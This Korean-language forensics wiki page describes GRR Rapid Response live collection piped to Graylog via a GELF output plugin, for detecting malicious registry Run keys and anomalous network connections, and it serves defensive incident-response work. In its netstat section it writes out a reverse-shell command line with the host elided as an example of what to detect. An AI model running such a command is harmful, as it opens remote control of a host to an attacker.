---
technique: Remote Live Forensics GRR
perspective: Investigator
topic: Extraction / Analysis
attck: —
related_artifacts:
  - Windows_Registry_Memory
related_crime:
  - 기업 내 악성코드 감염 호스트 탐지
  - 대규모 네트워크 침해 대응 (DFIR)
  - 원격 라이브 포렌식 수집
sources:
  - brown_2020
updated: 2026-04-19
---

## 개요
GRR Rapid Response(오픈소스 원격 라이브 포렌식 프레임워크)의 수집 결과를 GELF(Graylog Extended Log Format) JSON으로 변환해 Graylog에 전송·인덱싱하는 GELFOutputPlugin 기반 엔터프라이즈 포렌식 기법.

## 메커니즘

### GRR 아키텍처
- **서버-클라이언트**: GRR 서버 → 배포된 GRR 에이전트(클라이언트)에 명령 발행
- **Flow**: 단일 클라이언트 대상 수집 작업
- **Hunt**: 다수 클라이언트 일괄 수집 작업
- **Output Plugin**: 수집 결과를 외부 시스템으로 전송하는 확장 포인트

### GELFOutputPlugin 구현
```
ProcessResponses → _MakePayload → _SendPayload
```
- `_MakePayload`: GRR 메시지 → GELF JSON 변환 (timestamp, host, level, 커스텀 필드)
- `_SendPayload`: HTTP POST → Graylog GELF HTTP Input
- GELF 장점: syslog payload 크기 제한 없음; JSON 타입 지원; GZIP/zlib 압축

## 수집 절차

### Windows 레지스트리 Run 키 탐지
1. GRR RegistryFinder Hunt 실행 → `HKCU/.../Run/*` 스캔
2. GELFOutputPlugin → Graylog 전송
3. Graylog 대시보드: 감염 호스트 목록, 시간대별 분포 시각화

### 네트워크 연결 이상 탐지
1. GRR Netstat Flow → 활성 연결 수집
2. GELF → Graylog 전송
3. 역방향 셸(예: `bash -i >& /dev/tcp/.../4444 0>&1`) 연결 호스트 식별

## 탐지 방법 (Investigator)
- 수천 개 엔드포인트에서 동시 Hunt 실행 → 감염 범위 신속 파악
- Graylog 검색·필터·시각화로 IOC 기반 실시간 추적

## 한계 & 주의사항
- GRR 에이전트 사전 배포 필요 — 미배포 호스트 적용 불가
- 소규모 랩 환경 검증; 대규모 엔터프라이즈 성능 미검증
- 라이브 포렌식 — 획득 시점 이후 데이터는 수집 불가; 지속적 모니터링 필요

## 논문별 근거
| 논문 | 핵심 발견 |
|------|-----------|
| [[papers/brown_2020]] | GELFOutputPlugin 구현; Windows Registry + Linux Netstat 시나리오 검증 |

## 관련 페이지
[[artifacts/Windows_Registry_Memory]]
